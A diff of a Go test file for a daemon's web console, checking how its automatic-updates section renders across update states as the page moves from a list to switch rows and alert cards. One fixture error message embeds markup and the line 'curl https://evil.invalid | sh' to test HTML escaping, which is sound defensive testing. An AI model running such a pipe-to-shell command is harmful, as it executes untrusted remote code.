@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"html/template"
 	"net/http"
 	"net/http/httptest"
 	"regexp"
@@ -58,40 +59,13 @@ func requestWithCanceledContext(path string) *http.Request {
 	return req
 }
 
-func TestUpdatesSection_ModeWords(t *testing.T) {
-	now := time.Now()
-	for _, tc := range []struct {
-		name   string
-		status func() update.Status
-		want   string
-	}{
-		{"automatic", func() update.Status { return autoStatus(now) }, `<span class="badge ok">Automatic</span>`},
-		{"notify: no updater wired", func() update.Status { return releaseStatus(now) }, `<span class="badge ok">Notify</span>`},
-		{"notify: paused", func() update.Status {
-			st := autoStatus(now)
-			st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now}
-			return st
-		}, `<span class="badge ok">Notify</span>`},
-		{"off", func() update.Status {
-			st := autoStatus(now)
-			st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false)}, true)
-			return st
-		}, `<span class="badge">Off</span>`},
-	} {
-		t.Run(tc.name, func(t *testing.T) {
-			st := tc.status()
-			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
-			sec := updatesSection(t, mux)
-			require.Contains(t, sec, tc.want)
-			_, reason := st.Mode()
-			require.Contains(t, sec, "<span>"+reason+"</span>")
-		})
-	}
-}
-
-// The rows and buttons for automatic updates, in each state that changes them.
+// The automatic-updates parts of the section, in each state that changes
+// them: the switch row and its line, the first card's newest release and
+// Update now, the update under way, and the alert card -- one item per state,
+// each with its action, the attempt's error only in its hint.
 func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 	now := time.Now()
+	const autoOn = `<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" checked>`
 	for _, tc := range []struct {
 		name   string
 		base   config.Update
@@ -103,13 +77,16 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 			name: "up to date",
 			base: autoBase,
 			want: []string{
-				"<dt>Automatic updates</dt>", `<span class="badge ok">on</span>`, "On by default: a new release installs by itself at a quiet moment.",
-				"<dt>To update by hand</dt>",
-				`<form method="post" action="/console/settings/updates/auto" aria-label="Automatic updates">`,
-				`<input type="hidden" name="auto" value="off">`, "Turn automatic updates off",
-				`<button class="btn small" type="submit" disabled title="No newer release is known">`, "Update now</button>",
+				`<div class="set-row" id="updates-auto">`, "<strong>Install updates by themselves</strong>",
+				`<span class="set-row-sub">On: a new release installs by itself at a quiet moment.</span>`,
+				"A new release installs by itself once it is 24h old, when no agent session is live, or at a lull in requests after waiting 24h. " +
+					"Seamless restarts to finish; a release that fails its health check is rolled back and skipped. To update by hand, run seamlessd update.",
+				`<form method="post" action="/console/settings/updates/auto" id="updates-auto-form" data-autosave>`,
+				`<input type="hidden" name="auto" value="off">`, autoOn,
+				"Up to date</span>",
 			},
-			absent: []string{"<dt>Next update</dt>", "confirm(", "/console/settings/updates/resume", "<dt>Last attempt</dt>"},
+			absent: []string{"/console/settings/updates/apply", "confirm(", "/console/settings/updates/resume", `role="alert"`,
+				"Last update", `class="up-hand"`},
 		},
 		{
 			name: "waiting for live sessions",
@@ -121,13 +98,12 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.WaitCode, st.Waiting = update.WaitSessions, "waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h"
 			},
 			want: []string{
-				"<dt>Next update</dt>", `<strong class="mono">v0.7.3</strong>`,
-				"<span>installs by itself: waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h</span>",
-				"pending since", "5h ago", "deadline in 19h",
+				`<span class="mono">v0.7.3</span> installs by itself: waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h`,
+				"pending since 5h ago", "deadline in 19h",
 				`data-confirm="Install v0.7.3 now? The daemon restarts to finish, so agent sessions lose Seamless for a moment. This skips the soak and does not wait for agents to go idle." data-confirm-label="Install now"`,
-				"Update to v0.7.3 now</button>",
+				"Update to v0.7.3 now</button>", "v0.7.3 is out &middot; ",
 			},
-			absent: []string{"disabled title=\"No newer release"},
+			absent: []string{"disabled title=", "On: a new release installs"},
 		},
 		{
 			name: "soaking",
@@ -138,7 +114,7 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.WaitCode, st.Waiting = update.WaitSoak, "v0.7.3 waits out its 24h soak, about 18h to go"
 			},
 			want: []string{
-				"<dt>Next update</dt>", "<span>installs by itself once it is 24h old</span>",
+				`<span class="mono">v0.7.3</span> installs by itself once it is 24h old`,
 				"soak ends around " + string(clockDate(now.Add(18*time.Hour))),
 			},
 			absent: []string{"pending since"},
@@ -153,15 +129,15 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Target, st.WaitCode, st.Waiting = st.Newest, update.WaitInProgress, "updating to v0.7.3: verify"
 			},
 			want: []string{
-				"<dt>Updating now</dt>", `<span class="badge accent">in progress</span>`, "v0.7.2 &rarr; v0.7.3",
-				"<span>verifying the release</span>", `<span class="faint">automatic</span>`, "started 2m ago",
-				`disabled title="An update is in progress"`,
+				`<span class="badge accent up-chip">`, "Updating to v0.7.3</span>",
+				"v0.7.2 &rarr; v0.7.3: verifying the release &middot; automatic", "started 2m ago",
 			},
-			absent: []string{"<dt>Next update</dt>", "confirm("},
+			// The update under way stands where Update now would.
+			absent: []string{"confirm(", "/console/settings/updates/apply", "installs by itself:"},
 		},
 		{
 			// The installer restarted the daemon on v0.7.3 before the record
-			// moved past install: the row speaks from the new version's side.
+			// moved past install: the card speaks from the new version's side.
 			name: "confirming",
 			base: autoBase,
 			mutate: func(st *update.Status) {
@@ -171,10 +147,10 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 					Stage: update.StageInstall, SpawnedAt: now.Add(-2 * time.Minute)}
 			},
 			want: []string{
-				"<dt>Updating now</dt>", `<span class="badge ok">confirming</span>`, "v0.7.2 &rarr; v0.7.3",
-				"<span>the new version is serving; the updater is confirming it</span>", "started 2m ago",
+				`<span class="badge ok up-chip">`, "Confirming v0.7.3</span>",
+				"v0.7.2 &rarr; v0.7.3: the new version is serving; the updater is confirming it", "started 2m ago",
 			},
-			absent: []string{`<span class="badge accent">in progress</span>`, "running the installer"},
+			absent: []string{`<span class="badge accent up-chip">`, "running the installer"},
 		},
 		{
 			name: "rolled back, blocked",
@@ -188,16 +164,16 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.WaitCode, st.Waiting = update.WaitBlocked, "automatic updates skip v0.7.3: the update to it rolled back"
 			},
 			want: []string{
-				"<dt>Last attempt</dt>", `<span class="badge warn">rolled back</span>`, "v0.7.2 &rarr; v0.7.3",
-				"It failed after installing, and v0.7.2 was restored.",
-				`<small class="updates-error updates-attempt-error">`,
-				"rollback failed &lt;b&gt;badly&lt;/b&gt;: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz",
-				`Log: <span class="mono">/data/update/logs/01M4.log</span>`,
-				"<dt>Skipped releases</dt>", `<span class="mono">v0.7.3</span>: the update to it rolled back`,
-				"Automatic updates skip these releases until a newer one is out; Resume does not clear them, and Update now does not skip them.",
+				`<div class="up-alert is-warn" role="alert">`, `data-alert="attempt"`, "<strong>The update to v0.7.3 rolled back.</strong>",
+				"It failed after installing, and v0.7.2 was restored. Automatic updates skip v0.7.3: the update to it rolled back.",
+				// The skip is the attempt's own line; its meaning and the
+				// updater's message wait in the hint, escaped.
+				"Resume does not clear them, and Update now does not skip them.",
+				"The updater said: rollback failed &lt;b&gt;badly&lt;/b&gt;: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz",
+				`<span class="up-cmd" title="/data/update/logs/01M4.log">`, `data-copy="/data/update/logs/01M4.log"`,
 				"Update to v0.7.3 now</button>",
 			},
-			absent: []string{"<b>badly</b>", "<dt>Next update</dt>", "/console/settings/updates/resume"},
+			absent: []string{"<b>badly</b>", `data-alert="skipped"`, "/console/settings/updates/resume", "installs by itself:"},
 		},
 		{
 			name: "paused",
@@ -207,12 +183,12 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Paused = &update.Pause{Reason: update.PauseRollbacks, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now.Add(-time.Hour)}
 			},
 			want: []string{
-				`<span class="badge ok">Notify</span>`, "For now they paused themselves: see Paused below.",
-				"<dt>Paused</dt>", `<span class="badge warn">paused</span>`,
-				"Automatic updates paused themselves: two updates in a row rolled back (v0.7.3, v0.7.4).",
-				`<form method="post" action="/console/settings/updates/resume">`, "Resume automatic updates</button>",
+				`data-alert="paused"`, "<strong>Automatic updates paused themselves.</strong>",
+				"Two updates in a row rolled back (v0.7.3, v0.7.4). Update now still works.",
+				`<form method="post" action="/console/settings/updates/resume">`, "Resume</button>",
+				`<span class="set-row-sub">On, but they paused themselves: see above.</span>`,
 			},
-			absent: []string{"<dt>Next update</dt>"},
+			absent: []string{"installs by itself:"},
 		},
 		{
 			name: "held",
@@ -223,10 +199,10 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.WaitCode, st.Waiting = update.WaitHeld, "v0.7.3 is held back: this install went back from v0.7.3"
 			},
 			want: []string{
-				"<dt>Held back</dt>", `Releases up to <span class="mono">v0.7.3</span> are skipped: this install went back from <span class="mono">v0.7.3</span>.`,
-				"Resume automatic updates</button>",
+				`data-alert="held"`, "<strong>Releases up to v0.7.3 are held back.</strong>", "This install went back from v0.7.3.",
+				"Resume lets automatic updates take them again; Update now lifts the hold too.", "Resume</button>",
 			},
-			absent: []string{"<dt>Next update</dt>"},
+			absent: []string{"installs by itself:"},
 		},
 		{
 			name: "interrupted, backing off",
@@ -238,10 +214,10 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Backoff = &update.Backoff{Until: now.Add(40 * time.Minute), Count: 2, Version: ver(0, 7, 3), Reason: update.OutcomeInterrupted}
 			},
 			want: []string{
-				`<span class="badge warn">interrupted</span>`, "v0.7.2 still runs.",
-				"<dt>Next try</dt>", "The attempt on v0.7.3 was interrupted (2 in a row); automatic updates try again",
-				">in 40m</time>.",
+				"<strong>The update to v0.7.3 did not finish.</strong>", "v0.7.2 still runs.",
+				"The attempt on v0.7.3 was interrupted (2 in a row); automatic updates try again", ">in 40m</time>.",
 			},
+			absent: []string{`data-alert="backoff"`},
 		},
 		{
 			name: "refused at the gates: a stale binary, with the owner's restart",
@@ -253,10 +229,10 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 					Error: "gates: the installed seamlessd is not v0.7.2", FoldedAt: now.Add(-20 * time.Minute)}
 			},
 			want: []string{
-				`<span class="badge warn">failed</span>`,
-				"<small>It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed. " +
-					"Restart the service so it runs the installed release: seamlessd restart.</small>",
-				"gates: the installed seamlessd is not v0.7.2",
+				"<strong>The update to v0.7.3 failed.</strong>",
+				"It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed. " +
+					"Restart the service so it runs the installed release: seamlessd restart.",
+				"The updater said: gates: the installed seamlessd is not v0.7.2",
 			},
 		},
 		{
@@ -268,7 +244,7 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: update.RefusalStaleBinary,
 					Error: "gates: the installed seamlessd is not v0.7.1", FoldedAt: now.Add(-20 * time.Minute)}
 			},
-			want:   []string{"<small>It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed.</small>"},
+			want:   []string{"It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed."},
 			absent: []string{"seamlessd restart"},
 		},
 		{
@@ -280,7 +256,7 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: "disk_full",
 					Error: "gates: the disk is full", FoldedAt: now.Add(-20 * time.Minute)}
 			},
-			want:   []string{"<small>It stopped while checking it may install now, before anything changed.</small>"},
+			want:   []string{"It stopped while checking it may install now, before anything changed."},
 			absent: []string{"disk_full", "seamlessd restart"},
 		},
 		{
@@ -292,10 +268,12 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 					Error: "applied with warnings: hooks for Claude Code were not rewired", FoldedAt: now.Add(-time.Hour)}
 			},
 			want: []string{
-				`<span class="badge warn">applied with warnings</span>`,
-				"Run <span class=\"mono\">seamlessd install-hooks</span>", `data-copy="seamlessd install-hooks"`, "to re-wire your agents.",
-				"applied with warnings: hooks for Claude Code were not rewired",
+				"<strong>v0.7.2 applied with warnings.</strong>",
+				"v0.7.2 serves, but the installer reported a problem, so some agent wiring may be stale. Run seamlessd install-hooks to re-wire your agents.",
+				`<span class="up-cmd"><span class="mono">seamlessd install-hooks</span>`, `data-copy="seamlessd install-hooks"`,
+				"The updater said: applied with warnings: hooks for Claude Code were not rewired",
 			},
+			absent: []string{"Last update"},
 		},
 		{
 			name: "a failed rollback names how to recover",
@@ -306,9 +284,11 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Paused = &update.Pause{Reason: update.PauseBroken, Versions: []update.Version{ver(0, 7, 3)}, At: now}
 			},
 			want: []string{
-				`<span class="badge danger">not rolled back</span>`, `<span class="faint">Update now</span>`,
-				"could not be restored cleanly, so automatic updates paused themselves. The error below says how to recover.",
-				"To recover:\n  1. reinstall v0.7.2", `<span class="badge danger">paused</span>`,
+				`<div class="up-alert is-danger" role="alert">`,
+				`<div class="up-alert-item is-danger" data-alert="paused">`, `<div class="up-alert-item is-danger" data-alert="attempt">`,
+				"<strong>The update to v0.7.3 could not be rolled back cleanly.</strong>",
+				"could not be restored cleanly, so automatic updates paused themselves. Its details say how to recover.",
+				"v0.7.2 to v0.7.3, Update now: not rolled back.", "The updater said: To recover:\n  1. reinstall v0.7.2",
 			},
 		},
 		{
@@ -321,17 +301,16 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				withNewer(st, now)
 			},
 			want: []string{
-				`<span class="badge ok">Notify</span>`, `<span class="badge">off</span>`,
-				"Off: update.auto: false is set in the config file or environment, so this console cannot turn them on.",
+				`<span class="set-row-sub">Off: new releases are announced, and installing one is your call.</span>`,
 				// The file decides this one switch: its locked chip sits
 				// beside it, with where to change it in its hint, and the
 				// head's chip says where the rest comes from.
-				`<button class="btn small primary" type="submit" disabled>Turn automatic updates on</button>`,
-				`<span class="src-chip is-locked">`,
+				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" disabled>`,
 				"update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there.",
 				`<span class="src-chip is-file">`,
 				"Update to v0.7.3 now</button>", // Update now works whatever update.auto says
 			},
+			absent: []string{`name="auto" value="off"`},
 		},
 		{
 			name: "checks turned off in the console",
@@ -340,10 +319,11 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false), Auto: boolPtr(true)}, true)
 			},
 			want: []string{
-				"Off while update checks are off: with no update traffic there is nothing to install.",
-				`disabled title="Update checks are off"`, `<form id="updates-reset"`,
+				`<span class="set-row-sub">Off while update checks are off: with no update traffic there is nothing to install.</span>`,
+				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves" disabled>`,
+				`<form id="updates-reset"`,
 			},
-			absent: []string{"/console/settings/updates/auto"},
+			absent: []string{`name="auto" value="off"`, "src-chip is-locked"},
 		},
 		{
 			name: "automatic updates turned off in the console",
@@ -352,13 +332,13 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
 			},
 			want: []string{
-				"Off: turned off in this console.", `<input type="hidden" name="auto" value="on">`,
-				`<button class="btn small primary" type="submit">Turn automatic updates on</button>`,
+				`<span class="set-row-sub">Off: new releases are announced, and installing one is your call.</span>`,
+				`<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves">`,
 				`<span class="src-chip is-override">`,
 				"Automatic updates are set here, which wins over the config file until you reset it; update checks follow the build&#39;s default.",
 				`<form id="updates-reset" method="post" action="/console/settings/updates/reset"></form>`,
 			},
-			absent: []string{"The build&#39;s default"},
+			absent: []string{"The build&#39;s default:", `name="auto" value="off"`},
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -375,16 +355,18 @@ func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
 				require.NotContains(t, sec, gone)
 			}
 			// A value the file makes final is said once, by its chip, and
-			// its switch carries no sentence of its own.
+			// its switch carries no sentence of its own; no row of the old
+			// list survives.
 			require.LessOrEqual(t, strings.Count(sec, "Config file decides"), 1)
-			require.NotContains(t, sec, `title="Set in the config file or environment"`)
-			require.NotContains(t, sec, `class="updates-note"><svg class="ico ico-lock"`)
+			require.LessOrEqual(t, strings.Count(sec, "update.auto"), 1)
+			require.NotContains(t, sec, "<dt>")
+			require.NotContains(t, sec, "Turn automatic updates")
 		})
 	}
 }
 
 // An install that cannot update itself gets none of the automatic-update
-// controls: the mode line says why.
+// controls: the first card's To update row says what to run, and why.
 func TestUpdatesSection_NotifyOnlyInstallsGetNoAutoControls(t *testing.T) {
 	now := time.Now()
 	for name, mutate := range map[string]func(st *update.Status){
@@ -404,20 +386,20 @@ func TestUpdatesSection_NotifyOnlyInstallsGetNoAutoControls(t *testing.T) {
 			mutate(&st)
 			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
 			sec := updatesSection(t, mux)
-			for _, gone := range []string{"<dt>Automatic updates</dt>", "/console/settings/updates/auto",
-				"/console/settings/updates/apply", "/console/settings/updates/resume", "<dt>Held back</dt>", "To update by hand"} {
+			for _, gone := range []string{`id="updates-auto"`, "/console/settings/updates/auto",
+				"/console/settings/updates/apply", "/console/settings/updates/resume", `data-alert="held"`} {
 				require.NotContains(t, sec, gone)
 			}
+			require.Contains(t, sec, `<span class="up-kicker">To update</span><span class="mono">`+template.HTMLEscapeString(st.Install.Hint))
 		})
 	}
 }
 
-// Update now: a success says what started, and each refusal is its own
-// message, built from the status the checker returned.
-// TestUpdatesSection_SoakWordedOnce: the Mode line, the Next update row and the
-// version fact's hover word update.min_age alike, with update.SpanWords. The
-// two rows used to disagree on one page for a soak that is not a whole number
-// of hours: "once they are 90m old" above "once it is 1h30m old".
+// TestUpdatesSection_SoakWordedOnce: the automatic-updates hint, the next
+// update's line and the version fact's hover word update.min_age alike, with
+// update.SpanWords. They used to disagree on one page for a soak that is not
+// a whole number of hours: "once they are 90m old" above "once it is 1h30m
+// old".
 func TestUpdatesSection_SoakWordedOnce(t *testing.T) {
 	now := time.Now()
 	base := autoBase
@@ -430,13 +412,15 @@ func TestUpdatesSection_SoakWordedOnce(t *testing.T) {
 
 	_, mux, _ := newUpdatesConsole(t, base, &st)
 	sec := updatesSection(t, mux)
-	require.Contains(t, sec, "installs new releases by itself once they are 90m old")
-	require.Contains(t, sec, "<span>installs by itself once it is 90m old</span>")
+	require.Contains(t, sec, "A new release installs by itself once it is 90m old")
+	require.Contains(t, sec, `<span class="mono">v0.7.3</span> installs by itself once it is 90m old`)
 	require.NotContains(t, sec, "1h30m")
 	_, then := newestFate(st, now)
 	require.Equal(t, "it installs by itself once it is 90m old", then)
 }
 
+// Update now: a success says what started, and each refusal is its own
+// message, built from the status the checker returned.
 func TestUpdatesApplyNow_Flashes(t *testing.T) {
 	now := time.Now()
 	applying := func(st update.Status) update.Status {
@@ -583,8 +567,8 @@ func TestUpdatesAuto_StoresTheSwitch(t *testing.T) {
 		require.Equal(t, update.SourceConsole, fake.Status().Settings.AutoSource)
 
 		sec := updatesSection(t, mux)
-		require.Contains(t, sec, "Off: turned off in this console.", "the page the redirect lands on shows the new state")
-		require.Contains(t, sec, "Turn automatic updates on")
+		require.Contains(t, sec, "Off: new releases are announced, and installing one is your call.", "the page the redirect lands on shows the new state")
+		require.Contains(t, sec, `<input type="checkbox" role="switch" name="auto" value="on" aria-label="Install updates by themselves">`)
 
 		param, msg = locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
 		require.Equal(t, "notice", param)
@@ -1050,7 +1034,7 @@ func TestUpdateEvents_StartedAndFailed(t *testing.T) {
 // refused -- and, with no pin, says nothing about it at all.
 func TestUpdatesSection_ReleaseSigners(t *testing.T) {
 	now := time.Now()
-	const row = "<dt>Owner-signed releases</dt>"
+	const row = "<strong>Owner-signed releases</strong>"
 
 	t.Run("no pin: no row, even with a refusal on record", func(t *testing.T) {
 		st := autoStatus(now)
@@ -1068,7 +1052,8 @@ func TestUpdatesSection_ReleaseSigners(t *testing.T) {
 		_, mux, _ := newUpdatesConsole(t, pinned, &st)
 		sec := updatesSection(t, mux)
 		require.Contains(t, sec, row)
-		require.Contains(t, sec, `<span class="mono">/opt/seamless/etc/release_signers</span>`)
+		require.Contains(t, sec, "verifies against a key in /opt/seamless/etc/release_signers (update.release_signers)", "the file is in the row's hint")
+		require.Contains(t, sec, `<div class="set-row-control"><span class="badge ok">required</span></div>`)
 		require.NotContains(t, sec, "Last refused")
 	})
 	t.Run("a pin and the last refusal, in fixed words", func(t *testing.T) {
